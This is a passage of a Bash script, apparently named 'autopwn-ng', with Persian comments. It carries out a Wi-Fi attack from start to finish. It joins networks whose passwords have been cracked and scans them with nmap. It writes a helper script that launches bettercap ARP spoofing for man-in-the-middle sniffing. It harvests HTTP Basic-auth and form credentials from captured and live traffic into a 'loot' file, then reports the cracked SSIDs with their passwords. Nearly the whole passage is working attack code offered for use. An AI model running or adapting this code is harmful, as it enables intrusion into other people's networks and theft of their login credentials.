      if nmcli dev wifi connect "$b" password "$p" ifname "$IFACE2" >/dev/null 2>&1; then
        sleep 5
        det=$(ip -4 route 2>/dev/null | awk -v dev="$IFACE2" '$0 ~ dev && /proto kernel/ {print $1; exit}')
        [ -n "$det" ] && sub="$det"
        nmcli dev disconnect "$IFACE2" >/dev/null 2>&1 || true
      fi
    fi
    # ۲) مسیرهای kernel موجود (اتصال قبلی)
    if [ -z "$sub" ]; then
      sub=$(ip -4 route 2>/dev/null | awk '/proto kernel/ {print $1; exit}')
    fi
    # ۳) فایل‌های DHCP lease
    if [ -z "$sub" ]; then
      for f in /var/lib/dhcp/*.leases /var/lib/NetworkManager/*.lease; do
        [ -r "$f" ] || continue
        gw=$(grep -oE 'option routers [0-9.]+' "$f" 2>/dev/null | awk '{print $3}' | head -1)
        [ -n "$gw" ] && { IFS=. read -r o1 o2 o3 _ <<<"$gw"; sub="${o1}.${o2}.${o3}.0/24"; break; }
      done
    fi
    # ۴) gateway پیش‌فرض → فرض /24
    if [ -z "$sub" ]; then
      gw=$(ip -4 route 2>/dev/null | awk '/default/ {print $3; exit}')
      [ -n "$gw" ] && { IFS=. read -r o1 o2 o3 _ <<<"$gw"; sub="${o1}.${o2}.${o3}.0/24"; }
    fi
    printf '%s' "${sub:-192.168.1.0/24}"
  }
  SUBNET=$(detect_subnet)
  if [ "$SUBNET" = "192.168.1.0/24" ]; then
    warn "subnet تشخیص داده نشد؛ پیش‌فرض $SUBNET"
  else
    ok "subnet تشخیص داده شد: $SUBNET"
  fi
  # nmap: اسکن شبکهٔ کرک‌شده برای شناسایی سرویس‌ها
  if command -v nmap >/dev/null; then
    c "  → nmap اسکن شبکه ($SUBNET)"
    nmap -sn "$SUBNET" -oN "$REPORT/nmap-hosts.txt" 2>/dev/null || true
    nmap -sV -p 22,80,443,445,3389,8080 "$SUBNET" -oN "$REPORT/nmap-services.txt" 2>/dev/null || true
    ok "نتایج nmap: $REPORT/nmap-hosts.txt"
  fi
  cat > "$REPORT/connect.sh" <<EOF
#!/usr/bin/env bash
# اتصال به شبکه کرک‌شده و شروع MITM
nmcli dev wifi connect "$b" password "$p"
sleep 5
sudo bettercap -iface "$IFACE" -eval 'set arp.spoof.fullduplex true; arp.spoof on; net.sniff on'
EOF
  chmod +x "$REPORT/connect.sh"
  ok "اسکریپت اتصال + bettercap: $REPORT/connect.sh"
fi

  save_checkpoint 7

# ---------- فاز ۷: برداشت اعتبارنامهٔ HTTP ----------
if [ "$SKIP_TO" -le 7 ] && [ "$DO_HARVEST" -eq 1 ] && [ -s "$WORK/cracked.txt" ]; then
  hr; c "فاز ۷ — برداشت اعتبارنامهٔ HTTP (passive)"
  LOOT="$REPORT/loot.tsv"
  printf 'timestamp\tsource_ip\tdest_host\tmethod\turi\tusername\tpassword\ttype\n' > "$LOOT"

  parse_pcap_creds() {
    local pcap="$1"
    [ -s "$pcap" ] || return 0
    command -v tshark >/dev/null || return 0
    # ۱) Basic Authentication
    tshark -r "$pcap" -Y 'http.authorization contains "Basic"' -T fields \
      -e frame.time -e ip.src -e http.host -e http.request.method -e http.request.uri -e http.authorization \
      2>/dev/null | while IFS=$'\t' read -r ts src host method uri auth; do
      [ -z "$auth" ] && continue
      b64="${auth#* }"
      creds=$(printf '%s' "$b64" | base64 -d 2>/dev/null)
      [ -z "$creds" ] && continue
      u="${creds%%:*}"; p="${creds#*:}"
      [ "$u" = "$creds" ] && p=''
      printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\tBasic\n' \
        "${ts:-}" "${src:-}" "${host:-}" "${method:-}" "${uri:-}" "$u" "$p" >> "$LOOT"
      ok "Basic auth: $u:$p  ($host$uri)"
    done
    # ۲) فرم‌های POST (user/pass)
    tshark -r "$pcap" -Y 'http.request.method == "POST"' -T fields \
      -e frame.time -e ip.src -e http.host -e http.request.uri -e http.file_data \
      2>/dev/null | while IFS=$'\t' read -r ts src host uri body; do
      [ -z "$body" ] && continue
      # استخراج پارامترهای credential-like
      user=''; pass=''
      for kv in $(printf '%s' "$body" | tr '&' ' '); do
        key="${kv%%=*}"; val="${kv#*=}"
        key_l=$(printf '%s' "$key" | tr '[:upper:]' '[:lower:]')
        case "$key_l" in
          *user*|*login*|*email*|*account*|*name*) [ -z "$user" ] && user="$val";;
          *pass*|*pwd*|*secret*|*token*) [ -z "$pass" ] && pass="$val";;
        esac
      done
      if [ -n "$user" ] || [ -n "$pass" ]; then
        printf '%s\t%s\t%s\tPOST\t%s\t%s\t%s\tForm\n' \
          "${ts:-}" "${src:-}" "${host:-}" "${uri:-}" "$user" "$pass" >> "$LOOT"
        [ -n "$user" ] && ok "Form cred: $user / $pass  ($host$uri)"
      fi
    done
  }

  # پردازش capture موجود
  parse_pcap_creds "$CAP"

  # برداشت زنده (کوتاه) از ترافیک HTTP
  if command -v tshark >/dev/null; then
    c "  → برداشت زنده HTTP برای ${HARVEST_TIME}s روی $MON"
    timeout "$HARVEST_TIME" tshark -i "$MON" -Y http -w "$WORK/http-live.pcapng" >/dev/null 2>&1 || true
    parse_pcap_creds "$WORK/http-live.pcapng"
  fi

  # خلاصه JSON (اختیاری)
  if command -v jq >/dev/null && [ -s "$LOOT" ]; then
    tail -n +2 "$LOOT" | awk -F'\t' '{printf "{\"ts\":\"%s\",\"src\":\"%s\",\"host\":\"%s\",\"method\":\"%s\",\"uri\":\"%s\",\"user\":\"%s\",\"pass\":\"%s\",\"type\":\"%s\"}\n",$1,$2,$3,$4,$5,$6,$7,$8}' \
      | jq -s '.' > "$REPORT/loot.json" 2>/dev/null || true
  fi

  if [ "$(wc -l < "$LOOT")" -gt 1 ]; then
    ok "اعتبارنامه‌های HTTP ذخیره شدند: $LOOT"
    c "تعداد: $(( $(wc -l < "$LOOT") - 1 ))"
  else
    warn "هیچ اعتبارنامهٔ HTTP در ترافیک یافت نشد."
  fi
fi

# ---------- گزارش ----------
if [ "$SKIP_TO" -le 8 ]; then
PMKID_N=$(grep -c '^\*\*\*\*' "$HASH" 2>/dev/null || true)
EAPOL_N=$(grep -c 'WPA\*02' "$HASH" 2>/dev/null || true)
EAP_N=$(wc -l < "$WORK/mschapv2.txt" 2>/dev/null || true)
PMKID_N=${PMKID_N:-0}
EAPOL_N=${EAPOL_N:-0}
EAP_N=${EAP_N:-0}
hr
{
  echo "# گزارش autopwn-ng"
  echo "تاریخ: $(date -Is)"
  echo "پروفایل: $PROFILE | مدت برداشت: ${CAPTURE}s | مونیتور: $MON"
  echo
  echo "## هش‌ها"
  echo "- PMKID: $PMKID_N"
  echo "- EAPOL: $EAPOL_N"
  echo "- Enterprise: $EAP_N"
  echo
  echo "## نتایج"
  if [ -s "$WORK/cracked.txt" ]; then
    while IFS='|' read -r a b2 c2; do
      echo "- **SSID:** $c2  \`BSSID: $a\`  →  **پسورد:** \`$b2\`"
    done < "$WORK/cracked.txt"
  else
    echo "- هیچ پسوردی بازیابی نشد."
  fi
} > "$REPORT/summary.md"

jq -R -s 'split("\n") | map(select(length>0)) | map(split("|")) |
  map({bssid: .[0], password: .[1], essid: .[2], source: (.[3] // "crack")})' \
  "$WORK/cracked.txt" > "$REPORT/summary.json" 2>/dev/null

echo
if [ -s "$WORK/cracked.txt" ]; then
  ok "═══ نتایج ═══"
  awk -F'|' '{printf "  SSID: %-28s  پسورد: %s\n", $3, $2}' "$WORK/cracked.txt"
  c "گزارش: $REPORT/summary.md"
else
  warn "کرک نشد. وردلیست بزرگ‌تر یا hashcat با GPU قوی‌تر لازم است."
fi

  save_checkpoint 8
fi
